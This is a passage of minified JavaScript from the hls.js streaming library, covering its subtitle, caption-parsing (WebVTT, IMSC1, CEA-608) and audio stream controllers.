t=this.hls;t.off($.MEDIA_ATTACHED,this.onMediaAttached,this),t.off($.MEDIA_DETACHING,this.onMediaDetaching,this),t.off($.MANIFEST_LOADING,this.onManifestLoading,this),t.off($.LEVEL_LOADED,this.onLevelLoaded,this),t.off($.ERROR,this.onError,this),t.off($.SUBTITLE_TRACKS_UPDATED,this.onSubtitleTracksUpdated,this),t.off($.SUBTITLE_TRACK_SWITCH,this.onSubtitleTrackSwitch,this),t.off($.SUBTITLE_TRACK_LOADED,this.onSubtitleTrackLoaded,this),t.off($.SUBTITLE_FRAG_PROCESSED,this.onSubtitleFragProcessed,this),t.off($.BUFFER_FLUSHING,this.onBufferFlushing,this),t.off($.FRAG_BUFFERED,this.onFragBuffered,this)}startLoad(t){this.stopLoad(),this.state=L_IDLE,this.setInterval(500),this.nextLoadPosition=this.startPosition=this.lastCurrentTime=t,this.tick()}onManifestLoading(){this.mainDetails=null,this.fragmentTracker.removeAllFragments()}onMediaDetaching(){this.tracksBuffered=[],super.onMediaDetaching()}onLevelLoaded(t,e){this.mainDetails=e.details}onSubtitleFragProcessed(t,r){var{frag:r,success:n}=r;if(this.fragPrevious=r,this.state=L_IDLE,n){var i=this.tracksBuffered[this.currentTrackId];if(i){let e;var a=r.start;for(let t=0;t<i.length;t++)if(a>=i[t].start&&a<=i[t].end){e=i[t];break}n=r.start+r.duration,e?e.end=n:(e={start:a,end:n},i.push(e)),this.fragmentTracker.fragBuffered(r)}}}onBufferFlushing(t,e){var{startOffset:r,endOffset:n}=e;if(0===r&&n!==Number.POSITIVE_INFINITY){const i=n-1;i<=0||(e.endOffsetSubtitles=Math.max(0,i),this.tracksBuffered.forEach((e=>{for(let t=0;t<e.length;)if(e[t].end<=i)e.shift();else{if(!(e[t].start<i))break;e[t].start=i,t++}})),this.fragmentTracker.removeFragmentsInRange(r,i,be))}}onFragBuffered(t,e){this.loadedmetadata||e.frag.type!==A||null!=(e=this.media)&&e.buffered.length&&(this.loadedmetadata=!0)}onError(t,e){(null==(e=e.frag)?void 0:e.type)===be&&(this.fragCurrent&&this.fragCurrent.abortRequests(),this.state!==L_STOPPED)&&(this.state=L_IDLE)}onSubtitleTracksUpdated(t,{subtitleTracks:e}){Xn(this.levels,e)?this.levels=e.map((t=>new Ke(t))):(this.tracksBuffered=[],this.levels=e.map((t=>(t=new Ke(t),this.tracksBuffered[t.id]=[],t))),this.fragmentTracker.removeFragmentsInRange(0,Number.POSITIVE_INFINITY,be),this.fragPrevious=null,this.mediaBuffer=null)}onSubtitleTrackSwitch(t,e){this.currentTrackId=e.id,this.levels.length&&-1!==this.currentTrackId?(null!=(e=this.levels[this.currentTrackId])&&e.details?this.mediaBuffer=this.mediaBufferTimeRanges:this.mediaBuffer=null,e&&this.setInterval(500)):this.clearInterval()}onSubtitleTrackLoaded(t,e){var{details:e,id:r}=e,{currentTrackId:n,levels:i}=this;if(i.length){var a=i[n];if(!(r>=i.length||r!==n)&&a){this.mediaBuffer=this.mediaBufferTimeRanges;let t=0;if(e.live||null!=(i=a.details)&&i.live){if(n=this.mainDetails,e.deltaUpdateFailed||!n)return;i=n.fragments[0],a.details?0===(t=this.alignPlaylists(e,a.details))&&i&&qe(e,t=i.start):e.hasProgramDateTime&&n.hasProgramDateTime?(Nr(e,n),t=e.fragments[0].start):i&&qe(e,t=i.start)}a.details=e,this.levelLastLoaded=r,this.startFragRequested||!this.mainDetails&&e.live||this.setStartPosition(a.details,t),this.tick(),e.live&&!this.fragCurrent&&this.media&&this.state===L_IDLE&&!ir(null,e.fragments,this.media.currentTime,0)&&(this.warn("Subtitle playlist not aligned with playback"),a.details=void 0)}}}_handleFragmentLoadComplete(t){const{frag:r,payload:e}=t;t=r.decryptdata;const n=this.hls;if(!this.fragContextChanged(r)&&e&&0<e.byteLength&&t&&t.key&&t.iv&&"AES-128"===t.method){const i=performance.now();this.decrypter.decrypt(new Uint8Array(e),t.key.buffer,t.iv.buffer).catch((t=>{throw n.trigger($.ERROR,{type:K.MEDIA_ERROR,details:H.FRAG_DECRYPT_ERROR,fatal:!1,error:t,reason:t.message,frag:r}),t})).then((t=>{var e=performance.now();n.trigger($.FRAG_DECRYPTED,{frag:r,payload:t,stats:{tstart:i,tdecrypt:e}})})).catch((t=>{this.warn(t.name+": "+t.message),this.state=L_IDLE}))}}doTick(){if(this.media){if(this.state===L_IDLE){var{currentTrackId:e,levels:r}=this,e=r[e];if(r.length&&e&&e.details){var r=this.config,n=this.getLoadPosition(),{end:n,len:i}=S.bufferedInfo(this.tracksBuffered[this.currentTrackId]||[],n,r.maxBufferHole),a=this.getFwdBufferInfo(this.media,A),s=e.details;if(!((a=this.getMaxBufferLength(null==a?void 0:a.len)+s.levelTargetDuration)<i)){var i=(a=s.fragments).length,o=s.edge;let t=null;var l=this.fragPrevious;n<o?(r=o-(o=r.maxFragLookUpTolerance)<n?0:o,!(t=ir(l,a,Math.max(a[0].start,n),r))&&l&&l.start<a[0].start&&(t=a[0])):t=a[i-1],t&&("initSegment"!==(t=this.mapToInitFragWhenRequired(t)).sn&&(o=a[t.sn-s.startSN-1])&&o.cc===t.cc&&this.fragmentTracker.getState(o)===mr&&(t=o),this.fragmentTracker.getState(t)===mr)&&this.loadFragment(t,e,n)}}}}else this.state=L_IDLE}getMaxBufferLength(t){var e=super.getMaxBufferLength();return t?Math.max(e,t):e}loadFragment(t,e,r){"initSegment"===(this.fragCurrent=t).sn?this._loadInitSegment(t,e):(this.startFragRequested=!0,super.loadFragment(t,e,r))}get mediaBufferTimeRanges(){return new Jn(this.tracksBuffered[this.currentTrackId]||[])}},subtitleTrackController:class extends dr{constructor(t){super(t,"[subtitle-track-controller]"),this.media=null,this.tracks=[],this.groupId=null,this.tracksInGroup=[],this.trackId=-1,this.selectDefaultTrack=!0,this.queuedDefaultTrack=-1,this.trackChangeListener=()=>this.onTextTracksChanged(),this.asyncPollTrackChange=()=>this.pollTrackChange(0),this.useTextTrackPolling=!1,this.subtitlePollingInterval=-1,this._subtitleDisplay=!0,this.registerListeners()}destroy(){this.unregisterListeners(),this.tracks.length=0,this.tracksInGroup.length=0,this.trackChangeListener=this.asyncPollTrackChange=null,super.destroy()}get subtitleDisplay(){return this._subtitleDisplay}set subtitleDisplay(t){this._subtitleDisplay=t,-1<this.trackId&&this.toggleTrackModes(this.trackId)}registerListeners(){var t=this.hls;t.on($.MEDIA_ATTACHED,this.onMediaAttached,this),t.on($.MEDIA_DETACHING,this.onMediaDetaching,this),t.on($.MANIFEST_LOADING,this.onManifestLoading,this),t.on($.MANIFEST_PARSED,this.onManifestParsed,this),t.on($.LEVEL_LOADING,this.onLevelLoading,this),t.on($.LEVEL_SWITCHING,this.onLevelSwitching,this),t.on($.SUBTITLE_TRACK_LOADED,this.onSubtitleTrackLoaded,this),t.on($.ERROR,this.onError,this)}unregisterListeners(){var t=this.hls;t.off($.MEDIA_ATTACHED,this.onMediaAttached,this),t.off($.MEDIA_DETACHING,this.onMediaDetaching,this),t.off($.MANIFEST_LOADING,this.onManifestLoading,this),t.off($.MANIFEST_PARSED,this.onManifestParsed,this),t.off($.LEVEL_LOADING,this.onLevelLoading,this),t.off($.LEVEL_SWITCHING,this.onLevelSwitching,this),t.off($.SUBTITLE_TRACK_LOADED,this.onSubtitleTrackLoaded,this),t.off($.ERROR,this.onError,this)}onMediaAttached(t,e){this.media=e.media,this.media&&(-1<this.queuedDefaultTrack&&(this.subtitleTrack=this.queuedDefaultTrack,this.queuedDefaultTrack=-1),this.useTextTrackPolling=!(this.media.textTracks&&"onchange"in this.media.textTracks),this.useTextTrackPolling?this.pollTrackChange(500):this.media.textTracks.addEventListener("change",this.asyncPollTrackChange))}pollTrackChange(t){self.clearInterval(this.subtitlePollingInterval),this.subtitlePollingInterval=self.setInterval(this.trackChangeListener,t)}onMediaDetaching(){this.media&&(self.clearInterval(this.subtitlePollingInterval),this.useTextTrackPolling||this.media.textTracks.removeEventListener("change",this.asyncPollTrackChange),-1<this.trackId&&(this.queuedDefaultTrack=this.trackId),Zn(this.media.textTracks).forEach((t=>{Re(t)})),this.subtitleTrack=-1,this.media=null)}onManifestLoading(){this.tracks=[],this.groupId=null,this.tracksInGroup=[],this.trackId=-1,this.selectDefaultTrack=!0}onManifestParsed(t,e){this.tracks=e.subtitleTracks}onSubtitleTrackLoaded(t,e){var r,{id:n,details:i}=e,a=this.trackId;(a=this.tracksInGroup[a])?(r=a.details,a.details=e.details,this.log(`subtitle track ${n} loaded [${i.startSN}-${i.endSN}]`),n===this.trackId&&this.playlistLoaded(n,e,r)):this.warn("Invalid subtitle track id "+n)}onLevelLoading(t,e){this.switchLevel(e.level)}onLevelSwitching(t,e){this.switchLevel(e.level)}switchLevel(t){if(null!=(t=this.hls.levels[t])&&t.textGroupIds){const i=t.textGroupIds[t.urlId];var e,r,n;t=this.tracksInGroup?this.tracksInGroup[this.trackId]:void 0;this.groupId!==i?(e=this.tracks.filter((t=>!i||t.groupId===i)),this.tracksInGroup=e,r=this.findTrackId(null==t?void 0:t.name)||this.findTrackId(),this.groupId=i||null,n={subtitleTracks:e},this.log(`Updating subtitle tracks, ${e.length} track(s) found in "${i}" group-id`),this.hls.trigger($.SUBTITLE_TRACKS_UPDATED,n),-1!==r&&this.setSubtitleTrack(r,t)):this.shouldReloadPlaylist(t)&&this.setSubtitleTrack(this.trackId,t)}}findTrackId(e){var r=this.tracksInGroup;for(let t=0;t<r.length;t++){var n=r[t];if((!this.selectDefaultTrack||n.default)&&(!e||e===n.name))return n.id}return-1}onError(t,e){!e.fatal&&e.context&&e.context.type===b&&e.context.id===this.trackId&&e.context.groupId===this.groupId&&this.checkRetry(e)}get subtitleTracks(){return this.tracksInGroup}get subtitleTrack(){return this.trackId}set subtitleTrack(t){this.selectDefaultTrack=!1;var e=this.tracksInGroup?this.tracksInGroup[this.trackId]:void 0;this.setSubtitleTrack(t,e)}loadPlaylist(e){super.loadPlaylist();var r=this.tracksInGroup[this.trackId];if(this.shouldLoadPlaylist(r)){var n=r.id,i=r.groupId;let t=r.url;if(e)try{t=e.addDirectives(t)}catch(t){this.warn("Could not construct new URL with HLS Delivery Directives: "+t)}this.log("Loading subtitle playlist for id "+n),this.hls.trigger($.SUBTITLE_TRACK_LOADING,{url:t,id:n,groupId:i,deliveryDirectives:e||null})}}toggleTrackModes(t){var e,{media:r,trackId:n}=this;r&&(e=(r=Zn(r.textTracks)).filter((t=>t.groupId===this.groupId)),-1===t?[].slice.call(r).forEach((t=>{t.mode="disabled"})):(r=e[n])&&(r.mode="disabled"),n=e[t])&&(n.mode=this.subtitleDisplay?"showing":"hidden")}setSubtitleTrack(t,e){var r,n,i,a,s,o=this.tracksInGroup;this.media?(this.trackId!==t&&this.toggleTrackModes(t),this.trackId===t&&(-1===t||null!=(r=o[t])&&r.details)||t<-1||t>=o.length||(this.clearTimer(),r=o[t],this.log("Switching to subtitle-track "+t+(r?` "${r.name}" lang:${r.lang} group:`+r.groupId:"")),this.trackId=t,r?(({id:o,groupId:n="",name:i,type:a,url:s}=r),this.hls.trigger($.SUBTITLE_TRACK_SWITCH,{id:o,groupId:n,name:i,type:a,url:s}),o=this.switchParams(r.url,null==e?void 0:e.details),this.loadPlaylist(o)):this.hls.trigger($.SUBTITLE_TRACK_SWITCH,{id:t}))):this.queuedDefaultTrack=t}onTextTracksChanged(){if(this.useTextTrackPolling||self.clearInterval(this.subtitlePollingInterval),this.media&&this.hls.config.renderTextTracksNatively){let e=-1;var r=Zn(this.media.textTracks);for(let t=0;t<r.length;t++)if("hidden"===r[t].mode)e=t;else if("showing"===r[t].mode){e=t;break}this.subtitleTrack!==e&&(this.subtitleTrack=e)}}},timelineController:class{constructor(t){var e,r,n,i;this.hls=void 0,this.media=null,this.config=void 0,this.enabled=!0,this.Cues=void 0,this.textTracks=[],this.tracks=[],this.initPTS=[],this.unparsedVttFrags=[],this.captionsTracks={},this.nonNativeCaptionsTracks={},this.cea608Parser1=void 0,this.cea608Parser2=void 0,this.lastSn=-1,this.lastPartIndex=-1,this.prevCC=-1,this.vttCCs={ccOffset:0,presentationOffset:0,0:{start:0,prevCC:-1,new:!0}},this.captionsProperties=void 0,this.hls=t,this.config=t.config,this.Cues=t.config.cueHandler,this.captionsProperties={textTrack1:{label:this.config.captionsTextTrack1Label,languageCode:this.config.captionsTextTrack1LanguageCode},textTrack2:{label:this.config.captionsTextTrack2Label,languageCode:this.config.captionsTextTrack2LanguageCode},textTrack3:{label:this.config.captionsTextTrack3Label,languageCode:this.config.captionsTextTrack3LanguageCode},textTrack4:{label:this.config.captionsTextTrack4Label,languageCode:this.config.captionsTextTrack4LanguageCode}},this.config.enableCEA708Captions&&(e=new Ai(this,"textTrack1"),r=new Ai(this,"textTrack2"),n=new Ai(this,"textTrack3"),i=new Ai(this,"textTrack4"),this.cea608Parser1=new yi(1,e,r),this.cea608Parser2=new yi(3,n,i)),t.on($.MEDIA_ATTACHING,this.onMediaAttaching,this),t.on($.MEDIA_DETACHING,this.onMediaDetaching,this),t.on($.MANIFEST_LOADING,this.onManifestLoading,this),t.on($.MANIFEST_LOADED,this.onManifestLoaded,this),t.on($.SUBTITLE_TRACKS_UPDATED,this.onSubtitleTracksUpdated,this),t.on($.FRAG_LOADING,this.onFragLoading,this),t.on($.FRAG_LOADED,this.onFragLoaded,this),t.on($.FRAG_PARSING_USERDATA,this.onFragParsingUserdata,this),t.on($.FRAG_DECRYPTED,this.onFragDecrypted,this),t.on($.INIT_PTS_FOUND,this.onInitPtsFound,this),t.on($.SUBTITLE_TRACKS_CLEARED,this.onSubtitleTracksCleared,this),t.on($.BUFFER_FLUSHING,this.onBufferFlushing,this)}destroy(){var t=this.hls;t.off($.MEDIA_ATTACHING,this.onMediaAttaching,this),t.off($.MEDIA_DETACHING,this.onMediaDetaching,this),t.off($.MANIFEST_LOADING,this.onManifestLoading,this),t.off($.MANIFEST_LOADED,this.onManifestLoaded,this),t.off($.SUBTITLE_TRACKS_UPDATED,this.onSubtitleTracksUpdated,this),t.off($.FRAG_LOADING,this.onFragLoading,this),t.off($.FRAG_LOADED,this.onFragLoaded,this),t.off($.FRAG_PARSING_USERDATA,this.onFragParsingUserdata,this),t.off($.FRAG_DECRYPTED,this.onFragDecrypted,this),t.off($.INIT_PTS_FOUND,this.onInitPtsFound,this),t.off($.SUBTITLE_TRACKS_CLEARED,this.onSubtitleTracksCleared,this),t.off($.BUFFER_FLUSHING,this.onBufferFlushing,this),this.hls=this.config=this.cea608Parser1=this.cea608Parser2=null}addCues(t,e,r,n,i){let a=!1;for(let t=i.length;t--;){var s=i[t];if(0<=(o=(l=s[0],o=s[1],u=e,Math.min(o,r)-Math.max(l,u)))&&(s[0]=Math.min(s[0],e),s[1]=Math.max(s[1],r),a=!0,.5<o/(r-e)))return}var l,o,u,h;a||i.push([e,r]),this.config.renderTextTracksNatively?(h=this.captionsTracks[t],this.Cues.newCue(h,e,r,n)):(h=this.Cues.newCue(null,e,r,n),this.hls.trigger($.CUES_PARSED,{type:"captions",cues:h,track:t}))}onInitPtsFound(t,{frag:e,id:r,initPTS:n,timescale:i}){var a=this.unparsedVttFrags;"main"===r&&(this.initPTS[e.cc]={baseTime:n,timescale:i}),a.length&&(this.unparsedVttFrags=[],a.forEach((t=>{this.onFragLoaded($.FRAG_LOADED,t)})))}getExistingTrack(e){var r=this.media;if(r)for(let t=0;t<r.textTracks.length;t++){var n=r.textTracks[t];if(n[e])return n}return null}createCaptionsTrack(t){this.config.renderTextTracksNatively?this.createNativeTrack(t):this.createNonNativeTrack(t)}createNativeTrack(t){var e,r,n,i,a;this.captionsTracks[t]||(({captionsProperties:n,captionsTracks:e,media:r}=this),({label:n,languageCode:i}=n[t]),(a=this.getExistingTrack(t))?(e[t]=a,Re(e[t]),Le(e[t],r)):(a=this.createTextTrack("captions",n,i))&&(a[t]=!0,e[t]=a))}createNonNativeTrack(t){var e;this.nonNativeCaptionsTracks[t]||(e=this.captionsProperties[t])&&(e={_id:t,label:e.label,kind:"captions",default:!!e.media&&!!e.media.default,closedCaptions:e.media},this.nonNativeCaptionsTracks[t]=e,this.hls.trigger($.NON_NATIVE_TEXT_TRACKS_FOUND,{tracks:[e]}))}createTextTrack(t,e,r){var n=this.media;if(n)return n.addTextTrack(t,e,r)}onMediaAttaching(t,e){this.media=e.media,this._cleanTracks()}onMediaDetaching(){const e=this.captionsTracks;Object.keys(e).forEach((t=>{Re(e[t]),delete e[t]})),this.nonNativeCaptionsTracks={}}onManifestLoading(){this.lastSn=-1,this.lastPartIndex=-1,this.prevCC=-1,this.vttCCs={ccOffset:0,presentationOffset:0,0:{start:0,prevCC:-1,new:!0}},this._cleanTracks(),this.tracks=[],this.captionsTracks={},this.nonNativeCaptionsTracks={},this.textTracks=[],this.unparsedVttFrags=[],this.initPTS=[],this.cea608Parser1&&this.cea608Parser2&&(this.cea608Parser1.reset(),this.cea608Parser2.reset())}_cleanTracks(){var t=this.media;if(t){var e=t.textTracks;if(e)for(let t=0;t<e.length;t++)Re(e[t])}}onSubtitleTracksUpdated(t,e){var r=(e=e.subtitleTracks||[]).some((t=>t.textCodec===Ni));if(this.config.enableWebVTT||r&&this.config.enableIMSC1)if(Xn(this.tracks,e))this.tracks=e;else if(this.textTracks=[],this.tracks=e,this.config.renderTextTracksNatively){const s=this.media?this.media.textTracks:null;this.tracks.forEach(((r,t)=>{let n;if(s&&t<s.length){let e=null;for(let t=0;t<s.length;t++)if(a=r,(i=s[t])&&i.label===a.name&&!i.textTrack1&&!i.textTrack2){e=s[t];break}e&&(n=e)}var i,a;n?Re(n):(t=this._captionsOrSubtitlesFromCharacteristics(r),(n=this.createTextTrack(t,r.name,r.lang))&&(n.mode="disabled")),n&&(n.groupId=r.groupId,this.textTracks.push(n))}))}else this.tracks.length&&(r=this.tracks.map((t=>({label:t.name,kind:t.type.toLowerCase(),default:t.default,subtitleTrack:t}))),this.hls.trigger($.NON_NATIVE_TEXT_TRACKS_FOUND,{tracks:r}))}_captionsOrSubtitlesFromCharacteristics(t){if(t.attrs.CHARACTERISTICS){var e=/transcribes-spoken-dialog/gi.test(t.attrs.CHARACTERISTICS);t=/describes-music-and-sound/gi.test(t.attrs.CHARACTERISTICS);if(e&&t)return"captions"}return"subtitles"}onManifestLoaded(t,e){this.config.enableCEA708Captions&&e.captions&&e.captions.forEach((t=>{var e=/(?:CC|SERVICE)([1-4])/.exec(t.instreamId);e&&(e="textTrack"+e[1],e=this.captionsProperties[e])&&(e.label=t.name,t.lang&&(e.languageCode=t.lang),e.media=t)}))}closedCaptionsForLevel(t){return null==(t=this.hls.levels[t.level])?void 0:t.attrs["CLOSED-CAPTIONS"]}onFragLoading(t,e){var r,{cea608Parser1:n,cea608Parser2:i,lastSn:a,lastPartIndex:s}=this;this.enabled&&n&&i&&e.frag.type===A&&(r=e.frag.sn,e=null!=(e=null==e||null==(e=e.part)?void 0:e.index)?e:-1,r===a+1||r===a&&e===s+1||(n.reset(),i.reset()),this.lastSn=r,this.lastPartIndex=e)}onFragLoaded(t,e){var r,n,{frag:i,payload:a}=e;i.type===be&&(a.byteLength?(n="stats"in e,null!=(r=i.decryptdata)&&r.encrypted&&!n||(r=this.tracks[i.level],(n=this.vttCCs)[i.cc]||(n[i.cc]={start:i.start,prevCC:this.prevCC,new:!0},this.prevCC=i.cc),r&&r.textCodec===Ni?this._parseIMSC1(i,a):this._parseVTTs(e))):this.hls.trigger($.SUBTITLE_FRAG_PROCESSED,{success:!1,frag:i,error:new Error("Empty subtitle payload")}))}_parseIMSC1(e,t){const r=this.hls;Gi(t,this.initPTS[e.cc],(t=>{this._appendCues(t,e.level),r.trigger($.SUBTITLE_FRAG_PROCESSED,{success:!0,frag:e})}),(t=>{V.log("Failed to parse IMSC1: "+t),r.trigger($.SUBTITLE_FRAG_PROCESSED,{success:!1,frag:e,error:t})}))}_parseVTTs(r){var t;const{frag:n,payload:i}=r,{initPTS:e,unparsedVttFrags:a}=this,s=e.length-1;if(e[n.cc]||-1!=s){const o=this.hls;!function Fi(t,o,l,u,h,e,r){const n=new Ci;var i,a;t=T(new Uint8Array(t)).trim().replace(xi,"\n").split("\n");const c=[],d=o?([i,a=1]=[o.baseTime,o.timescale],bn(i,9e4,1/a)):0;let g,s="00:00.000",f=0,p=0,v=!0;n.oncue=function(t){var r=l[u];let e=l.ccOffset;var n,i=(f-d)/9e4;if(null!=r&&r.new)if(void 0!==p)e=l.ccOffset=r.start;else{var a=l,s=i;let t=a[r=u],e=a[t.prevCC];if(!e||!e.new&&t.new)a.ccOffset=a.presentationOffset=t.start,t.new=!1;else{for(;null!=(n=e)&&n.new;)a.ccOffset+=t.start-e.start,t.new=!1,e=a[(t=e).prevCC];a.presentationOffset=s}}if(i){if(!o)return void(g=new Error("Missing initPTS for VTT MPEGTS"));e=i-l.presentationOffset}r=t.endTime-t.startTime,s=Y(9e4*(t.startTime+e-p),9e4*h)/9e4,t.startTime=Math.max(s,0),t.endTime=Math.max(s+r,0),i=t.text.trim(),t.text=decodeURIComponent(encodeURIComponent(i)),t.id||(t.id=Mi(t.startTime,t.endTime,i)),0<t.endTime&&c.push(t)},n.onparsingerror=function(t){g=t},n.onflush=function(){g?r(g):e(c)},t.forEach((t=>{if(v){if(Pi(t,"X-TIMESTAMP-MAP=")){v=!1,t.slice(16).split(",").forEach((t=>{Pi(t,"LOCAL:")?s=t.slice(6):Pi(t,"MPEGTS:")&&(f=parseInt(t.slice(7)))}));try{p=function(t){var e=parseInt(t.slice(-3)),r=parseInt(t.slice(-6,-4)),n=parseInt(t.slice(-9,-7)),i=9<t.length?parseInt(t.substring(0,t.indexOf(":"))):0;if(N(e)&&N(r)&&N(n)&&N(i))return(e+=1e3*r)+6e4*n+36e5*i;throw Error("Malformed X-TIMESTAMP-MAP: Local:"+t)}(s)/1e3}catch(t){g=t}return}""===t&&(v=!1)}n.parse(t+"\n")})),n.flush()}(null!=(t=n.initSegment)&&t.data?Yt(n.initSegment.data,new Uint8Array(i)):i,this.initPTS[n.cc],this.vttCCs,n.cc,n.start,(t=>{this._appendCues(t,n.level),o.trigger($.SUBTITLE_FRAG_PROCESSED,{success:!0,frag:n})}),(t=>{var e="Missing initPTS for VTT MPEGTS"===t.message;e?a.push(r):this._fallbackToIMSC1(n,i),V.log("Failed to parse VTT cue: "+t),e&&s>n.cc||o.trigger($.SUBTITLE_FRAG_PROCESSED,{success:!1,frag:n,error:t})}))}else a.push(r)}_fallbackToIMSC1(t,e){const r=this.tracks[t.level];r.textCodec||Gi(e,this.initPTS[t.cc],(()=>{r.textCodec=Ni,this._parseIMSC1(t,e)}),(()=>{r.textCodec="wvtt"}))}_appendCues(t,e){var r=this.hls;if(this.config.renderTextTracksNatively){const i=this.textTracks[e];i&&"disabled"!==i.mode&&t.forEach((t=>ke(i,t)))}else{var n=this.tracks[e];n&&(n=n.default?"default":"subtitles"+e,r.trigger($.CUES_PARSED,{type:"subtitles",cues:t,track:n}))}}onFragDecrypted(t,e){e.frag.type===be&&this.onFragLoaded($.FRAG_LOADED,e)}onSubtitleTracksCleared(){this.tracks=[],this.captionsTracks={}}onFragParsingUserdata(t,e){var{cea608Parser1:r,cea608Parser2:n}=this;if(this.enabled&&r&&n){var{frag:e,samples:i}=e;if(e.type!==A||"NONE"!==this.closedCaptionsForLevel(e))for(let t=0;t<i.length;t++){var a=i[t].bytes;a&&(a=this.extractCea608Data(a),r.addData(i[t].pts,a[0]),n.addData(i[t].pts,a[1]))}}}onBufferFlushing(t,{startOffset:e,endOffset:r,endOffsetSubtitles:n,type:i}){var a=this.media;if(a&&!(a.currentTime<r)){if(!i||"video"===i){const s=this.captionsTracks;Object.keys(s).forEach((t=>we(s[t],e,r)))}if(this.config.renderTextTracksNatively&&0===e&&void 0!==n){const o=this.textTracks;Object.keys(o).forEach((t=>we(o[t],e,n)))}}}extractCea608Data(e){var r=[[],[]],n=31&e[0];let i=2;for(let t=0;t<n;t++){var a=e[i++],s=127&e[i++],o=127&e[i++];0==s&&0==o||!(4&a)||0!=(a&=3)&&1!=a||(r[a].push(s),r[a].push(o))}return r}},audioStreamController:class extends Kr{constructor(t,e,r){super(t,e,r,"[audio-stream-controller]",_),this.videoBuffer=null,this.videoTrackCC=-1,this.waitingVideoCC=-1,this.bufferedTrack=null,this.switchingTrack=null,this.trackId=-1,this.waitingData=null,this.mainDetails=null,this.bufferFlushed=!1,this.cachedTrackLoadedData=null,this._registerListeners()}onHandlerDestroying(){this._unregisterListeners(),this.mainDetails=null,this.bufferedTrack=null,this.switchingTrack=null}_registerListeners(){var t=this.hls;t.on($.MEDIA_ATTACHED,this.onMediaAttached,this),t.on($.MEDIA_DETACHING,this.onMediaDetaching,this),t.on($.MANIFEST_LOADING,this.onManifestLoading,this),t.on($.LEVEL_LOADED,this.onLevelLoaded,this),t.on($.AUDIO_TRACKS_UPDATED,this.onAudioTracksUpdated,this),t.on($.AUDIO_TRACK_SWITCHING,this.onAudioTrackSwitching,this),t.on($.AUDIO_TRACK_LOADED,this.onAudioTrackLoaded,this),t.on($.ERROR,this.onError,this),t.on($.BUFFER_RESET,this.onBufferReset,this),t.on($.BUFFER_CREATED,this.onBufferCreated,this),t.on($.BUFFER_FLUSHED,this.onBufferFlushed,this),t.on($.INIT_PTS_FOUND,this.onInitPtsFound,this),t.on($.FRAG_BUFFERED,this.onFragBuffered,this)}_unregisterListeners(){var t=this.hls;t.off($.MEDIA_ATTACHED,this.onMediaAttached,this),t.off($.MEDIA_DETACHING,this.onMediaDetaching,this),t.off($.MANIFEST_LOADING,this.onManifestLoading,this),t.off($.LEVEL_LOADED,this.onLevelLoaded,this),t.off($.AUDIO_TRACKS_UPDATED,this.onAudioTracksUpdated,this),t.off($.AUDIO_TRACK_SWITCHING,this.onAudioTrackSwitching,this),t.off($.AUDIO_TRACK_LOADED,this.onAudioTrackLoaded,this),t.off($.ERROR,this.onError,this),t.off($.BUFFER_RESET,this.onBufferReset,this),t.off($.BUFFER_CREATED,this.onBufferCreated,this),t.off($.BUFFER_FLUSHED,this.onBufferFlushed,this),t.off($.INIT_PTS_FOUND,this.onInitPtsFound,this),t.off($.FRAG_BUFFERED,this.onFragBuffered,this)}onInitPtsFound(t,{frag:e,id:r,initPTS:n,timescale:i}){"main"===r&&(r=e.cc,this.initPTS[e.cc]={baseTime:n,timescale:i},this.log(`InitPTS for cc: ${r} found from main: `+n),this.videoTrackCC=r,this.state===L_WAITING_INIT_PTS)&&this.tick()}startLoad(t){var e;this.levels?(e=this.lastCurrentTime,this.stopLoad(),this.setInterval(100),0<e&&-1===t?(this.log("Override startPosition with lastCurrentTime @"+e.toFixed(3)),t=e,this.state=L_IDLE):(this.loadedmetadata=!1,this.state=L_WAITING_TRACK),this.nextLoadPosition=this.startPosition=this.lastCurrentTime=t,this.tick()):(this.startPosition=t,this.state=L_STOPPED)}doTick(){switch(this.state){case L_IDLE:this.doTickIdle();break;case L_WAITING_TRACK:var e,{levels:t,trackId:e}=this;if(e=null==t||null==(t=t[e])?void 0:t.details){if(this.waitForCdnTuneIn(e))break;this.state=L_WAITING_INIT_PTS}break;case L_FRAG_LOADING_WAITING_RETRY:t=performance.now(),(!(e=this.retryDate)||e<=t||null!=(e=this.media)&&e.seeking)&&(this.log("RetryDate reached, switch back to IDLE state"),this.resetStartWhenNotLoaded(this.trackId),this.state=L_IDLE);break;case L_WAITING_INIT_PTS:var r,n,t;(t=this.waitingData)?(({frag:e,part:t,cache:r,complete:n}=t),void 0!==this.initPTS[e.cc]?(this.waitingData=null,this.waitingVideoCC=-1,this.state=L_FRAG_LOADING,t={frag:e,part:t,payload:r.flush(),networkDetails:null},this._handleFragmentLoadProgress(t),n&&super._handleFragmentLoadComplete(t)):this.videoTrackCC!==this.waitingVideoCC?(this.log(`Waiting fragment cc (${e.cc}) cancelled because video is at cc `+this.videoTrackCC),this.clearWaitingFragment()):(r=this.getLoadPosition(),ar((n=S.bufferInfo(this.mediaBuffer,r,this.config.maxBufferHole)).end,this.config.maxFragLookUpTolerance,e)<0&&(this.log(`Waiting fragment cc (${e.cc}) @ ${e.start} cancelled because another fragment at ${n.end} is needed`),this.clearWaitingFragment()))):this.state=L_IDLE}this.onTickEnd()}clearWaitingFragment(){var t=this.waitingData;t&&(this.fragmentTracker.removeFragment(t.frag),this.waitingData=null,this.waitingVideoCC=-1,this.state=L_IDLE)}resetLoadingState(){this.clearWaitingFragment(),super.resetLoadingState()}onTickEnd(){var t=this.media;null!=t&&t.readyState&&(this.lastCurrentTime=t.currentTime)}doTickIdle(){var{hls:n,levels:i,media:a,trackId:s}=this,o=n.config;if(null!=i&&i[s]&&(a||!this.startFragRequested&&o.startFragPrefetch))if(!(i=(o=i[s]).details)||i.live&&this.levelLastLoaded!==s||this.waitForCdnTuneIn(i))this.state=L_WAITING_TRACK;else if(s=this.mediaBuffer||this.media,this.bufferFlushed&&s&&(this.bufferFlushed=!1,this.afterBufferFlushed(s,y,_)),null!==(s=this.getFwdBufferInfo(s,_))){var{bufferedTrack:l,switchingTrack:u}=this;if(!u&&this._streamEnded(s,i))n.trigger($.BUFFER_EOS,{type:"audio"}),this.state=L_ENDED;else{var n=this.getFwdBufferInfo(this.videoBuffer||this.media,A),h=s.len,c=this.getMaxBufferLength(null==n?void 0:n.len);if(!(c<=h)||u){var d;h=i.fragments[0].start;let t=s.end,e=(u&&a&&(d=this.getLoadPosition(),l&&u.attrs!==l.attrs&&(t=d),i.PTSKnown)&&d<h&&(s.end>h||s.nextStart)&&(this.log("Alt audio track ahead of main track, seek to start of alt audio 